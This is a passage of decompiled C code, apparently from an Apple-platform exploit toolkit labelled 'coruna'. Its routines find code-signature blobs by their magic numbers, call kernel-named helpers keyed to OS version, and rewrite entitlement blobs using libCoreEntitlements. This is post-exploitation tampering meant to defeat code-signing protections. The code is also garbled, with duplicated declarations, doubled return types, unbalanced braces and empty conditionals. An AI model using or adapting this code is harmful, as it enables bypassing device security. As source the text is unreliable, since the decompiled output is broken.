            ptr[0x45] = '\0';
            ptr[0x46] = '\0';
            ptr[0x47] = '\0';
            ptr[0x58] = '\0';
            ptr[0x59] = '\0';
            ptr[0x5a] = '\0';
            ptr[0x5b] = '\0';
            ptr[0x5c] = '\0';
            ptr[0x5d] = '\0';
            ptr[0x5e] = '\0';
            ptr[0x5f] = '\0';
            ptr[0x50] = '\0';
            ptr[0x51] = '\0';
            ptr[0x52] = '\0';
            ptr[0x53] = '\0';
            ptr[0x54] = '\0';
            ptr[0x55] = '\0';
            ptr[0x56] = '\0';
            ptr[0x57] = '\0';
            ptr[0x28] = '\0';
            ptr[0x29] = '\0';
            ptr[0x2a] = '\0';
            ptr[0x2b] = '\0';
            ptr[0x2c] = '\0';
            ptr[0x2d] = '\0';
            ptr[0x2e] = '\0';
            ptr[0x2f] = '\0';
            ptr[0x20] = '\0';
            ptr[0x21] = '\0';
            ptr[0x22] = '\0';
            ptr[0x23] = '\0';
            ptr[0x24] = '\0';
            ptr[0x25] = '\0';
            ptr[0x26] = '\0';
            ptr[0x27] = '\0';
            ptr[0x38] = '\0';
            ptr[0x39] = '\0';
            ptr[0x3a] = '\0';
            ptr[0x3b] = '\0';
            ptr[0x3c] = '\0';
            ptr[0x3d] = '\0';
            ptr[0x3e] = '\0';
            ptr[0x3f] = '\0';
            ptr[0x30] = '\0';
            ptr[0x31] = '\0';
            ptr[0x32] = '\0';
            ptr[0x33] = '\0';
            ptr[0x34] = '\0';
            ptr[0x35] = '\0';
            ptr[0x36] = '\0';
            ptr[0x37] = '\0';
            ptr[8] = '\0';
            ptr[9] = '\0';
            ptr[10] = '\0';
            ptr[0xb] = '\0';
            ptr[0xc] = '\0';
            ptr[0xd] = '\0';
            ptr[0xe] = '\0';
            ptr[0xf] = '\0';
            ptr[0] = '\0';
            ptr[1] = '\0';
            ptr[2] = '\0';
            ptr[3] = '\0';
            ptr[4] = '\0';
            ptr[5] = '\0';
            ptr[6] = '\0';
            ptr[7] = '\0';
            ptr[0x18] = '\0';
            ptr[0x19] = '\0';
            ptr[0x1a] = '\0';
            ptr[0x1b] = '\0';
            ptr[0x1c] = '\0';
            ptr[0x1d] = '\0';
            ptr[0x1e] = '\0';
            ptr[0x1f] = '\0';
            ptr[0x10] = '\0';
            ptr[0x11] = '\0';
            ptr[0x12] = '\0';
            ptr[0x13] = '\0';
            ptr[0x14] = '\0';
            ptr[0x15] = '\0';
            ptr[0x16] = '\0';
            ptr[0x17] = '\0';
            _strlcpy(ptr,path,(unsigned long)tag);
            buf = (void *)0x0;
            err = coruna_kernel6544_via_memcpy_24a7c(scratch,0,ptr);
            if (err == 0) {
            err = false;
            }
            else {
            err = coruna_kernel6544_via_ctx_test_flag_9(size,scratch);
            err = err != 0;
            }
            if (buf != (void *)0x0) {
            _free(buf);
            }
            coruna_kernel6544_via_kernel09_via_bzero_2(scratch);
            return err;
          }
        }
        else {
          u = tag + kind;
          buf = _calloc((unsigned long)u,1);
          if (buf != (void *)0x0) {
            _memcpy(buf,ptr,(unsigned long)kind);
            *(uint *)((long)buf + 0x14) = version;
            _strlcpy((char *)((long)buf + (unsigned long)kind),path,(unsigned long)tag);
            version = (u & 0xff00ff00) >> 8 | (u & 0xff00ff) << 8;
            *(uint *)((long)buf + 4) = version >> 0x10 | version << 0x10;
            ptr = buf;
            if (size != 0 && !err) {
            ptr = (char *)((long)ptr + (unsigned long)port);
            ls11 = _strlen(ptr);
            _bzero(ptr,ls11);
            }
            err = coruna_kernel6544_via_memcpy_24a7c(scratch,0,ptr);
            if (err == 0) {
            err = false;
            }
            else {
            err = coruna_kernel6544_via_ctx_test_flag_9(size,scratch);
            err = err != 0;
            }
            if (buf != (void *)0x0) {
            _free(buf);
            }
            coruna_kernel6544_via_kernel09_via_bzero_2(scratch);
            return err;
          }
        }
        goto fail;
      }
    }
    err = true;
  }
check_ok:
  coruna_kernel6544_via_kernel09_via_bzero_2(scratch);
  return err;
}





uint64_t coruna_plist_dict_24a54(uint *size,uint64_t val,uint64_t *id_2)
{
  uint32_t u;
  uint size;
  uint version;
  uint port;
  bool err;
  uint64_t tag;
  uint64_t kind;
  char err;
  int err;
  uint64_t type_id;
  long handle;
  long addr;
  void *ptr;
  void *buf;
  size_t ls16;
  unsigned long type_id_8;
  char *ptr;
  char *buf;
  unsigned long type_id_9;
  unsigned long type_id_10;
  uint64_t scratch;
  uint64_t scratch;
  uint64_t bootargs;
  uint64_t thread_attr;
  uint64_t bootargs;
  char *thread_attr;
  uint64_t host_info;
  uint64_t serial_buf;
  uint64_t host_info;
  uint64_t action;
  uint64_t block_ctx;
  uint64_t stack_guard;
  uint64_t serial_buf;
  unsigned long action;
  unsigned long block_ctx;
  char *stack_guard;
  uint type_id_11;
  
  err = coruna_return_zero_236bc(size,val,0,1,&scratch);
  if ((err == 0) && (type_id = coruna_return_zero_236bc(size,val,0,0,&scratch), (int)type_id == 0)) {
    return type_id;
  }
  type_id_8 = *(unsigned long *)(size + 0x56);
  if ((0x1c1b19145fffff < type_id_8) && ((*size & 0x5584001) != 0 || 0x1f52ffffffffff < type_id_8)) {
    serial_buf = coruna_u64_pack71((serial_buf), (1));
  }
  if ((unsigned long)thread_attr >> 0x1d != 0) {
    handle = coruna_kernel6544_via_kernel6544_via_return_zero_2b000_2(size,host_info);
    if ((handle != 0) && (err = coruna_return_zero_24300(size,&block_ctx,&action), err != 0)) {
      handle = handle + (action & 0xffffffff);
      err = coruna_nop_stub_6(size,handle,8,&stack_guard);
      coruna_kernel6544_via_kernel09_via_bzero_2(&scratch);
      return 0;
    }
    coruna_kernel6544_via_kernel09_via_bzero_2(&scratch);
    return 0;
  }
  handle = coruna_wire_map_lookup(&scratch,host_info & 0xffffffff,0xfade0c02);
  coruna_kernel6544_via_kernel09_via_bzero_2(&scratch);
  return 0;
}





uint * coruna_wire_map_lookup(long handle,int flags,uint size)
{
  uint u;
  unsigned long size;
  uint64_t *ptr;
  
  if (handle != 0) {
    if (*(int *)(handle + 0x30) == 0) {
      if ((flags == 0) && (**(uint **)(handle + 0x38) == 0x20cdefa)) {
        return *(uint **)(handle + 0x38);
      }
    }
    else if (*(int *)(handle + 0x30) == 1) {
      u = **(uint **)(handle + 0x38);
      size = (unsigned long)u;
      if (u != 0) {
        ptr = (uint64_t *)(*(long *)(*(uint **)(handle + 0x38) + 2) + 8);
        do {
          if ((*(int *)(ptr + -1) == flags) &&
             (u = *(uint *)*ptr, u = (u & 0xff00ff00) >> 8 | (u & 0xff00ff) << 8,
             (u >> 0x10 | u << 0x10) == size)) {
            return (uint *)*ptr;
          }
          ptr = ptr + 2;
          size = size - 1;
        } while (size != 0);
      }
    }
  }
  return (uint *)0x0;
}





uint64_t coruna_kernel6544_via_memcpy_24a7c(uint64_t val,uint64_t id_2,uint64_t size_3)
{
  long handle;
  long addr;
  uint64_t u;
  
  handle = coruna_wire_map_slot_lookup(val,id_2,0xfade0c02);
  u = 0;
  if ((handle != 0) && (addr = coruna_memcpy_24a7c(size_3), u = 0, addr != 0)) {
    u = *(uint64_t *)(handle + 8);
    *(long *)(handle + 8) = addr;
    coruna_bzero(u);
    u = 1;
  }
  return u;
}





unsigned long coruna_kernel6544_via_ctx_test_flag_9(long arg,uint64_t val)

{
  int count;
  unsigned long type_id_14;
  long cache_20;
  uint64_t cache_61;
  uint cache_60;
  
  cache_60 = 0;
  cache_20 = arg;
  cache_61 = val;
  if ((*(unsigned long *)(arg + 0x158) < 0x1c1b1914600000) ||
     (count = coruna_ctx_test_flag(arg,4), count != 0)) {
    coruna_find_cs_blob_zone(&cache_20);
  }
  else {
    count = coruna_ctx_test_flag(arg,0x5584001);
    if ((count == 0) || (0x1c1b1e025fffff < *(unsigned long *)(arg + 0x158))) {
      type_id_14 = coruna_pthread_join_2ec18(arg,coruna_find_cs_blob_zone,&cache_20);
      count = (int)type_id_14;
    }
    else {
      type_id_14 = coruna_return_zero_1a9a8(arg,coruna_find_cs_blob_zone,&cache_20);
      count = (int)type_id_14;
    }
    if (count == 0) {
      return type_id_14;
    }
  }
  return (unsigned long)cache_60;
}





void coruna_kernel6544_via_kernel09_via_bzero_2(long handle)
{
  if (*(int *)(handle + 0x30) == 0) {
    coruna_bzero(*(uint64_t *)(handle + 0x38));
  }
  else if (*(int *)(handle + 0x30) == 1) {
    coruna_kernel09_via_bzero_2(*(uint64_t *)(handle + 0x38));
  }
  *(uint64_t *)(handle + 0x38) = 0;
  *(uint32_t *)(handle + 0x30) = 0xffffffff;
  return;
}





uint64_t coruna_cfdatagetbyteptr(uint *size,uint64_t val,char *path,unsigned long arg)
{
  unsigned long u;
  uint size;
  bool err;
  bool status;
  int err;
  uint64_t version;
  size_t ls7;
  long handle;
  long addr;
  unsigned long port;
  void *ptr;
  uint64_t tag;
  long scratch;
  char bootargs;
  int thread_attr;
  uint32_t scratch;
  void *host_info;
  uint8_t serial_buf[64];
  uint32_t action;
  char block_ctx;
  uint8_t stack_guard;
  
  host_info = (void *)0x0;
  bootargs = '\0';
  scratch = 0;
  version = coruna_plist_dict_24a54(size,val,serial_buf);
  if ((int)version == 0) {
    return version;
  }
  port = *(unsigned long *)(size + 0x56);
  if ((port < 0x1c1b1914600000) || ((*size & 0x5584001) == 0 && port < 0x1f530000000000)) {
    status = false;
    err = (arg & 1) == 0;
fail:
    handle = coruna_wire_map_lookup(serial_buf,5,0xfade7171);
    if (handle == 0) {
      if ((*size & 0x5584001) == 0) {
        ls7 = _strlen(path);
        if (status) {
          err = coruna_load_core_entitlements_25c5c(path,ls7,&scratch);
          if (err != 0) {
            version = _CFDataGetBytePtr(scratch);
            tag = _CFDataGetLength(scratch);
            err = coruna_return_zero_22748(serial_buf,7,0xfade7172,version,tag);
            if ((err != 0) && (err = coruna_kernel6544_via_wire_map_lookup_2(serial_buf,7), err != 0)) {
              tag = 0xfade7172;
              version = 7;
              err = coruna_kernel6544_via_wire_map_lookup(serial_buf,version,tag);
              if (err != 0) {
              err = coruna_kernel6544_via_ctx_test_flag_9(size,serial_buf);
              status = err == 0;
              ptr = host_info;
              if (ptr != (void *)0x0) {
              _free(ptr);
              }
              if (scratch != 0) {
              _CFRelease();
              }
              coruna_kernel6544_via_kernel09_via_bzero_2(serial_buf);
              if (status) {
              version = 0;
              }
              else if (*(unsigned long *)(size + 0x56) < 0x1f530000000000 && !err) {
              version = coruna_cfpropertylistcreatewithdata(size,val,path,0);
              }
              else {
              version = 1;
              }
              return version;
              }
              }
              else {
              status = false;
              ptr = host_info;
              if ((*(unsigned long *)(size + 0x56) < 0x1f530000000000) || ((arg & 1) == 0))
              if (ptr != (void *)0x0) {
              _free(ptr);
              }
              if (scratch != 0) {
              _CFRelease();
              }
              coruna_kernel6544_via_kernel09_via_bzero_2(serial_buf);
              if (status) {
              version = 0;
              }
              else if (*(unsigned long *)(size + 0x56) < 0x1f530000000000 && !err) {
              version = coruna_cfpropertylistcreatewithdata(size,val,path,0);
              }
              else {
              version = 1;
              }
              return version;
            }
          }
        }
        else {
          err = coruna_return_zero_22748(serial_buf,5,0xfade7171,path);
          version = 5;
          tag = 0xfade7171;
          err = coruna_kernel6544_via_wire_map_lookup(serial_buf,version,tag);
          if (err != 0) {
          err = coruna_kernel6544_via_ctx_test_flag_9(size,serial_buf);
          status = err == 0;
          ptr = host_info;
          if (ptr != (void *)0x0) {
          _free(ptr);
          }
          if (scratch != 0) {
          _CFRelease();
          }
          coruna_kernel6544_via_kernel09_via_bzero_2(serial_buf);
          if (status) {
          version = 0;
          }
          else if (*(unsigned long *)(size + 0x56) < 0x1f530000000000 && !err) {
          version = coruna_cfpropertylistcreatewithdata(size,val,path,0);
          }
          else {
          version = 1;
          }
          return version;
          }
          }
          else {
          status = false;
          ptr = host_info;
          if ((*(unsigned long *)(size + 0x56) < 0x1f530000000000) || ((arg & 1) == 0))
          if (ptr != (void *)0x0) {
          _free(ptr);
          }
          if (scratch != 0) {
          _CFRelease();
          }
          coruna_kernel6544_via_kernel09_via_bzero_2(serial_buf);
          if (status) {
          version = 0;
          }
          else if (*(unsigned long *)(size + 0x56) < 0x1f530000000000 && !err) {
          version = coruna_cfpropertylistcreatewithdata(size,val,path,0);
          }
          else {
          version = 1;
          }
          return version;
        }
      }
    }
    else {
      size = (*(uint *)(handle + 4) & 0xff00ff00) >> 8 | (*(uint *)(handle + 4) & 0xff00ff) << 8;
      port = (unsigned long)(size >> 0x10 | size << 0x10) - 8;
      ls7 = _strlen(path);
      err = coruna_cfrelease((void *)(handle + 8),port,path,ls7,&host_info,&thread_attr,&bootargs);
      if (err != 0) {
        if (bootargs != '\0') {
          if (0x1f52ffffffffff < *(unsigned long *)(size + 0x56) && !err) {
            err = coruna_kernel6544_residual_258(size,serial_buf,val,&bootargs);
            if (err == 0) goto check_ok;
            if (bootargs == '\0') goto skip;
          }
next:
          status = false;
          ptr = host_info;
          if (ptr != (void *)0x0) {
          _free(ptr);
          }
          if (scratch != 0) {
          _CFRelease();
          }
          coruna_kernel6544_via_kernel09_via_bzero_2(serial_buf);
          if (status) {
          version = 0;
          }
          else if (*(unsigned long *)(size + 0x56) < 0x1f530000000000 && !err) {
          version = coruna_cfpropertylistcreatewithdata(size,val,path,0);
          }
          else {
          version = 1;
          }
          return version;
        }
skip:
        ptr = host_info;
        if ((block_ctx != '\0') || ((*size & 0x5584001) == 0)) {
          err = coruna_memcpy_22470(serial_buf,5,0xfade7171,host_info,thread_attr);
          {
            status = true;
            if (ptr != (void *)0x0) {
            _free(ptr);
            }
            if (scratch != 0) {
            _CFRelease();
            }
            coruna_kernel6544_via_kernel09_via_bzero_2(serial_buf);
            if (status) {
            version = 0;
            }
            else if (*(unsigned long *)(size + 0x56) < 0x1f530000000000 && !err) {
            version = coruna_cfpropertylistcreatewithdata(size,val,path,0);
            }
            else {
            version = 1;
            }
            return version;
          }
cleanup:
          version = 5;
          tag = 0xfade7171;
          err = coruna_kernel6544_via_wire_map_lookup(serial_buf,version,tag);
          if (err != 0) {
          err = coruna_kernel6544_via_ctx_test_flag_9(size,serial_buf);
          status = err == 0;
          ptr = host_info;
          if (ptr != (void *)0x0) {
          _free(ptr);
          }
          if (scratch != 0) {
          _CFRelease();
          }
          coruna_kernel6544_via_kernel09_via_bzero_2(serial_buf);
          if (status) {
          version = 0;
          }
          else if (*(unsigned long *)(size + 0x56) < 0x1f530000000000 && !err) {
          version = coruna_cfpropertylistcreatewithdata(size,val,path,0);
          }
          else {
          version = 1;
          }
          return version;
          }
          }
          else {
          status = false;
          ptr = host_info;
          if ((*(unsigned long *)(size + 0x56) < 0x1f530000000000) || ((arg & 1) == 0))
          if (ptr != (void *)0x0) {
          _free(ptr);
          }
          if (scratch != 0) {
          _CFRelease();
          }
          coruna_kernel6544_via_kernel09_via_bzero_2(serial_buf);
          if (status) {
          version = 0;
          }
          else if (*(unsigned long *)(size + 0x56) < 0x1f530000000000 && !err) {
          version = coruna_cfpropertylistcreatewithdata(size,val,path,0);
          }
          else {
          version = 1;
          }
          return version;
        }
        addr = coruna_wire_map_lookup(serial_buf,action,0xfade0c02);
        if (addr != 0) {
          size = *(uint *)(addr + 0x28);
          if (size != 0) {
            u = port;
            if (port <= (unsigned long)size - 8) {
              u = (unsigned long)size - 8;
            }
            if ((size & 0x3fff) != 0) {
              u = port;
            }
            port = coruna_u64_pack((scratch), (thread_attr));
            if (port <= u) {
              _memcpy((void *)(handle + 8),host_info,port);
              _bzero((void *)(handle + port + 8),u - port);
              size = (thread_attr + 8U & 0xff00ff00) >> 8 | (thread_attr + 8U & 0xff00ff) << 8;
              *(uint *)(handle + 4) = size >> 0x10 | size << 0x10;
              version = 5;
              tag = 0xfade7171;
              err = coruna_kernel6544_via_wire_map_lookup(serial_buf,version,tag);
              if (err != 0) {
              err = coruna_kernel6544_via_ctx_test_flag_9(size,serial_buf);
              status = err == 0;
              ptr = host_info;
              if (ptr != (void *)0x0) {
              _free(ptr);
              }
              if (scratch != 0) {
              _CFRelease();
              }
              coruna_kernel6544_via_kernel09_via_bzero_2(serial_buf);
              if (status) {
              version = 0;
              }
              else if (*(unsigned long *)(size + 0x56) < 0x1f530000000000 && !err) {
              version = coruna_cfpropertylistcreatewithdata(size,val,path,0);
              }
              else {
              version = 1;
              }
              return version;
              }
              }
              else {
              status = false;
              ptr = host_info;
              if ((*(unsigned long *)(size + 0x56) < 0x1f530000000000) || ((arg & 1) == 0))
              if (ptr != (void *)0x0) {
              _free(ptr);
              }
              if (scratch != 0) {
              _CFRelease();
              }
              coruna_kernel6544_via_kernel09_via_bzero_2(serial_buf);
              if (status) {
              version = 0;
              }
              else if (*(unsigned long *)(size + 0x56) < 0x1f530000000000 && !err) {
              version = coruna_cfpropertylistcreatewithdata(size,val,path,0);
              }
              else {
              version = 1;
              }
              return version;
            }
          }
        }
      }
    }
  }
  else {
    block_ctx = '\x01';
    err = (arg & 1) == 0;
    if ((port < 0x1f530000000000) || ((arg & 1) == 0)) {
      if (port < 0x1f530000000000) {
        status = false;
        goto fail;
      }
    }
    else {
      stack_guard = 1;
    }
    handle = coruna_wire_map_lookup(serial_buf,7,0xfade7172);
    if (handle == 0) {
      status = true;
      goto fail;
    }
    size = (*(uint *)(handle + 4) & 0xff00ff00) >> 8 | (*(uint *)(handle + 4) & 0xff00ff) << 8;
    err = coruna_ce_query_context(handle + 8,(unsigned long)(size >> 0x10 | size << 0x10) - 8,path,&host_info,
                         &thread_attr,&bootargs);
    if (err != 0) {
      if (bootargs == '\0') {
found:
        ptr = host_info;
        tag = 0xfade7172;
        err = coruna_memcpy_22470(serial_buf,7,0xfade7172,host_info,thread_attr);
        if (err == 0) {
retry:
          status = true;
          if (ptr != (void *)0x0) {
          _free(ptr);
          }
          if (scratch != 0) {
          _CFRelease();
          }
          coruna_kernel6544_via_kernel09_via_bzero_2(serial_buf);
          if (status) {
          version = 0;
          }
          else if (*(unsigned long *)(size + 0x56) < 0x1f530000000000 && !err) {
          version = coruna_cfpropertylistcreatewithdata(size,val,path,0);
          }
          else {
          version = 1;
          }
          return version;
        }
        version = 7;
done:
        err = coruna_kernel6544_via_wire_map_lookup(serial_buf,version,tag);
        if (err != 0) {
          err = coruna_kernel6544_via_ctx_test_flag_9(size,serial_buf);
          status = err == 0;
          ptr = host_info;
          if (ptr != (void *)0x0) {
          _free(ptr);
          }
          if (scratch != 0) {
          _CFRelease();
          }
          coruna_kernel6544_via_kernel09_via_bzero_2(serial_buf);
          if (status) {
          version = 0;
          }
          else if (*(unsigned long *)(size + 0x56) < 0x1f530000000000 && !err) {
          version = coruna_cfpropertylistcreatewithdata(size,val,path,0);
          }
          else {
          version = 1;
          }
          return version;
        }
      }
      else {
        status = false;
        ptr = host_info;
        if ((*(unsigned long *)(size + 0x56) < 0x1f530000000000) || ((arg & 1) == 0))
        if (ptr != (void *)0x0) {
        _free(ptr);
        }
        if (scratch != 0) {
        _CFRelease();
        }
        coruna_kernel6544_via_kernel09_via_bzero_2(serial_buf);
        if (status) {
        version = 0;
        }
        else if (*(unsigned long *)(size + 0x56) < 0x1f530000000000 && !err) {
        version = coruna_cfpropertylistcreatewithdata(size,val,path,0);
        }
        else {
        version = 1;
        }
        return version;
      }
    }
  }
  status = true;
  ptr = host_info;
joined_r0x000256a4:
  if (ptr != (void *)0x0) {
    _free(ptr);
  }
  if (scratch != 0) {
    _CFRelease();
  }
  coruna_kernel6544_via_kernel09_via_bzero_2(serial_buf);
  if (status) {
    version = 0;
  }
  else if (*(unsigned long *)(size + 0x56) < 0x1f530000000000 && !err) {
    version = coruna_cfpropertylistcreatewithdata(size,val,path,0);
  }
  else {
    version = 1;
  }
  return version;
}





uint64_t
void coruna_ce_query_context(uint64_t val,uint64_t id_2,char *path,uint64_t *size_3,size_t *len
            ,uint64_t off_4)
{
  int err;
  long handle;
  long *ptr;
  uint64_t *ptr;
  void (*ptr)(void);
  void (*buf)(void);
  void (*str)(void);
  void (*copy)(void);
  long addr;
  uint64_t u;
  long off;
  size_t ls12;
  long base;
  long ctx_val;
  void *buf;
  void *str;
  long serial;
  uint64_t size;
  long scratch;
  long bootargs;
  long thread_attr;
  
  bootargs = 0;
  thread_attr = 0;
  scratch = 0;
  handle = _dlopen("/usr/lib/libCoreEntitlements.dylib",1);
  if ((handle == 0) || (ptr = (long *)_dlsym(handle,"kCENoError"), ptr == (long *)0x0)) {
fail:
    addr = 0;
    off = 0;
    base = 0;
    copy = (void (*)0x0;
  }
  else {
    serial = *ptr;
    ptr = (uint64_t *)_dlsym(handle,"CECRuntime");
    if (ptr == (uint64_t *)0x0) goto fail;
    size = *ptr;
    ptr = (void (*)_dlsym(handle,"CEManagedContextFromCFData");
    if (ptr == (void (*)0x0) goto fail;
    buf = (void (*)_dlsym(handle,"CEQueryContextToCFDictionary");
    if ((buf == (void (*)0x0) ||
       (str = (void (*)_dlsym(handle,"CESerializeCFDictionary"), str == (void (*)0x0))
    goto fail;
    copy = (void (*)_dlsym(handle,"CEReleaseManagedContext");
    if ((copy == (void (*)0x0) || (addr = _dlsym(handle,"CEGetErrorString"), addr == 0)) {
      addr = 0;
done:
      off = 0;
cleanup:
      base = 0;
    }
    else {
      u = *(uint64_t *)k_kernel_kcfallocatordefault_slot;
      addr = _CFDataCreateWithBytesNoCopy
                        (u,val,id_2,*(uint64_t *)k_kernel_kcfallocatornull_slot);
      off = 0;
      off = (*ptr)(size,addr,&scratch);
      if ((serial != off) || (off = (*buf)(scratch,&bootargs), serial != off))
      off = 0;
      off = _CFDictionaryCreateMutableCopy(u,0,bootargs);
      if (off == 0) goto cleanup;
      ls12 = _strlen(path);
      base = coruna_plist_from_bytes(path,ls12);
      if ((base != 0) && (err = coruna_kernel6544_via_cfdictionaryapplyfunction(off,base,off_4), err != 0)) {
        ctx_val = (*str)(size,off,&thread_attr);
        if (serial == ctx_val) {
          ls12 = _CFDataGetLength(thread_attr);
          buf = _malloc(ls12);
          if (buf != (void *)0x0) {
            str = (void *)_CFDataGetBytePtr(thread_attr);
            _memcpy(buf,str,ls12);
            *size_3 = buf;
            *len = ls12;
            size = 1;
            if (thread_attr != 0) {
            _CFRelease();
            }
            if (base != 0) {
            _CFRelease(base);
            }
            if (off != 0) {
            _CFRelease(off);
            }
            if (bootargs != 0) {
            _CFRelease();
            }
            if (scratch != 0) {
            (*copy)(&scratch);
            }
            if (addr != 0) {
            _CFRelease(addr);
            }
            if (handle != 0) {
            _dlclose(handle);
            }
            return size;
          }
        }
      }
    }
  }
  size = 0;
check_ok:
  if (thread_attr != 0) {
    _CFRelease();
  }
  if (base != 0) {
    _CFRelease(base);
  }
  if (off != 0) {
    _CFRelease(off);
  }
  if (bootargs != 0) {
    _CFRelease();
  }
  if (scratch != 0) {
    (*copy)(&scratch);
  }
  if (addr != 0) {
    _CFRelease(addr);
  }
  if (handle != 0) {
    _dlclose(handle);
  }
  return size;
}





uint64_t coruna_kernel6544_residual_258(long handle,long addr_2,uint64_t val,uint64_t id_2)
{
  long handle;
  long addr;
  uint64_t u;
  unsigned long size;
  long scratch;
  
  size = *(unsigned long *)(handle + 0x158);
  handle = 0x98;
  if (size < 0x1c1b1914600000) {
    handle = 0x90;
  }
  addr = 0xa8;
  if (size < 0x1f530000000000) {
    addr = handle;
  }
  handle = 0xa0;
  if (size < 0x1f530f02800000) {
    handle = addr;
  }
  u = coruna_kernel6544_residual_256(handle,*(long *)(addr_2 + 8) + handle,&scratch);
  if (((int)u != 0) && (u = coruna_kernel6544_via_kernel6544_via_return_zero_2b000_5(handle,val), (int)u != 0)) {
    *(bool *)id_2 = scratch == *(long *)(handle + 0x390);
    u = 1;
  }
  return u;
}





uint64_t
void coruna_memcpy_22470(uint64_t val,uint64_t id_2,uint size,void *ctx,unsigned long arg)
{
  size_t ls1;
  uint u;
  long handle;
  uint *ptr;
  uint64_t size;
  uint version;
  
  handle = coruna_wire_map_slot_lookup();
  size = 0;
  if (handle != 0) {
    ls1 = (arg & 0xffffffff) + 8;
    ptr = _malloc(ls1);
    size = 0;
    if (ptr != (uint *)0x0) {
      u = (size & 0xff00ff00) >> 8 | (size & 0xff00ff) << 8;
      version = (uint)ls1;
      version = (version & 0xff00ff00) >> 8 | (version & 0xff00ff) << 8;
      *ptr = u >> 0x10 | u << 0x10;
      ptr[1] = version >> 0x10 | version << 0x10;
      _memcpy(ptr + 2,ctx,arg & 0xffffffff);
      size = *(uint64_t *)(handle + 8);
      *(uint **)(handle + 8) = ptr;
      coruna_bzero(size);
      size = 1;
    }
  }
  return size;
}





void coruna_kernel6544_via_wire_map_lookup(long handle,uint size)
{
  uint u;
  long handle;
  long addr;
  uint64_t size;
  void *ptr;
  uint scratch;
  uint8_t bootargs[48];
  long thread_attr;
  
  thread_attr = *(long *)k_kernel_stack_chk_guard_slot;
  handle = coruna_wire_map_lookup();
  addr = coruna_wire_map_lookup(handle,*(uint32_t *)(handle + 0x40),0xfade0c02);
  size = 0;
  if (*(long *)k_kernel_stack_chk_guard_slot == thread_attr) {
  return;
  }
  ___stack_chk_fail(size);
}





bool coruna_load_core_entitlements_25c5c(uint64_t val,uint64_t id_2,uint64_t size_3)
{
  bool err;
  long handle;
  long *ptr;
  uint64_t *ptr;
  void (*ptr)(void);
  long addr;
  long off;
  long base;
  uint64_t u;
  uint64_t size;
  long ctx_val;
  
  handle = _dlopen("/usr/lib/libCoreEntitlements.dylib",1);
  if (handle == 0) {
    return false;
  }
  ptr = (long *)_dlsym(handle,"kCENoError");
  if (ptr != (long *)0x0) {
    ctx_val = *ptr;
    ptr = (uint64_t *)_dlsym(handle,"CECRuntime");
    if (ptr != (uint64_t *)0x0) {
      u = *ptr;
      ptr = (void (*)_dlsym(handle,"CESerializeCFDictionary");
      if ((ptr != (void (*)0x0) && (addr = _dlsym(handle,"CEGetErrorString"), addr != 0)) {
        size = *(uint64_t *)k_kernel_kcfallocatordefault_slot;
        addr = _CFDataCreateWithBytesNoCopy
                          (size,val,id_2,*(uint64_t *)k_kernel_kcfallocatornull_slot);
        if (addr != 0) {
          off = _CFPropertyListCreateWithData(size,addr,0,0,0);
          if (off != 0) {
            base = (*ptr)(u,off,size_3);
            err = ctx_val == base;
            _CFRelease(addr);
            _CFRelease(off);
            _dlclose(handle);
            return err;
          }
          _CFRelease(addr);
        }
      }
    }
  }
  err = false;
fail:
  _dlclose(handle);
  return err;
}





uint64_t coruna_return_zero_22748(byte *arg,uint64_t val,uint size,void *ctx,uint flags_2)
{
  size_t ls1;
  uint u;
  int err;
  uint *ptr;
  uint size;
  
  if (((*arg & 1) != 0) && (*(int *)(arg + 0x30) == 1)) {
    ls1 = (unsigned long)flags_2 + 8;
    ptr = _malloc(ls1);
    if (ptr == (uint *)0x0) {
      return 0;
    }
    u = (size & 0xff00ff00) >> 8 | (size & 0xff00ff) << 8;
    size = (uint)ls1;
    size = (size & 0xff00ff00) >> 8 | (size & 0xff00ff) << 8;
    *ptr = u >> 0x10 | u << 0x10;
    ptr[1] = size >> 0x10 | size << 0x10;
    _memcpy(ptr + 2,ctx,(unsigned long)flags_2);
    err = coruna_iokit_msg_append(*(uint64_t *)(arg + 0x38),val,ptr);
    if (err != -1) {
      return 1;
    }
    coruna_bzero(ptr);
  }
  return 0;
}





uint64_t coruna_kernel6544_via_wire_map_lookup_2(long handle,uint size)
{
  int err;
  int status;
  uint u;
  uint size;
  uint version;
  uint port;
  uint tag;
  void *ptr;
  void *buf;
  uint64_t kind;
  unsigned long type_id;
  
  ptr = (void *)coruna_wire_map_lookup(handle,*(uint32_t *)(handle + 0x40),0xfade0c02);
  kind = 0;
  if (ptr != (void *)0x0) {
    u = (*(uint *)((long)ptr + 0x18) & 0xff00ff00) >> 8 |
            (*(uint *)((long)ptr + 0x18) & 0xff00ff) << 8;
    u = u >> 0x10 | u << 0x10;
    if (u < size) {
      err = *(int *)(handle + 0x48);
      status = err * (size - u);
      size = (*(uint *)((long)ptr + 4) & 0xff00ff00) >> 8 |
              (*(uint *)((long)ptr + 4) & 0xff00ff) << 8;
      type_id = (unsigned long)((size >> 0x10 | size << 0x10) + status);
      buf = _malloc(type_id);
      kind = 0;
      if (buf != (void *)0x0) {
        _bzero(buf,type_id);
        size = (*(uint *)((long)ptr + 0x10) & 0xff00ff00) >> 8 |
                (*(uint *)((long)ptr + 0x10) & 0xff00ff) << 8;
        u = err * u;
        _memcpy(buf,ptr,(unsigned long)((size >> 0x10 | size << 0x10) - u));
        version = (*(uint *)((long)ptr + 4) & 0xff00ff00) >> 8 |
                (*(uint *)((long)ptr + 4) & 0xff00ff) << 8;
        port = (*(uint *)((long)ptr + 0x10) & 0xff00ff00) >> 8 |
                (*(uint *)((long)ptr + 0x10) & 0xff00ff) << 8;
        size = (*(uint *)((long)buf + 0x10) & 0xff00ff00) >> 8 |
                (*(uint *)((long)buf + 0x10) & 0xff00ff) << 8;
        size = (size >> 0x10 | size << 0x10) + status;
        tag = (size & 0xff00ff00) >> 8 | (size & 0xff00ff) << 8;
        *(uint *)((long)buf + 0x10) = tag >> 0x10 | tag << 0x10;
        tag = (*(uint *)((long)buf + 4) & 0xff00ff00) >> 8 |
                (*(uint *)((long)buf + 4) & 0xff00ff) << 8;
        tag = (tag >> 0x10 | tag << 0x10) + status;
        tag = (tag & 0xff00ff00) >> 8 | (tag & 0xff00ff) << 8;
        *(uint *)((long)buf + 4) = tag >> 0x10 | tag << 0x10;
        tag = (size & 0xff00ff00) >> 8 | (size & 0xff00ff) << 8;
        *(uint *)((long)buf + 0x18) = tag >> 0x10 | tag << 0x10;
        tag = (*(uint *)((long)ptr + 0x10) & 0xff00ff00) >> 8 |
                (*(uint *)((long)ptr + 0x10) & 0xff00ff) << 8;
        _memcpy((void *)((long)buf + ((unsigned long)size - (unsigned long)u)),
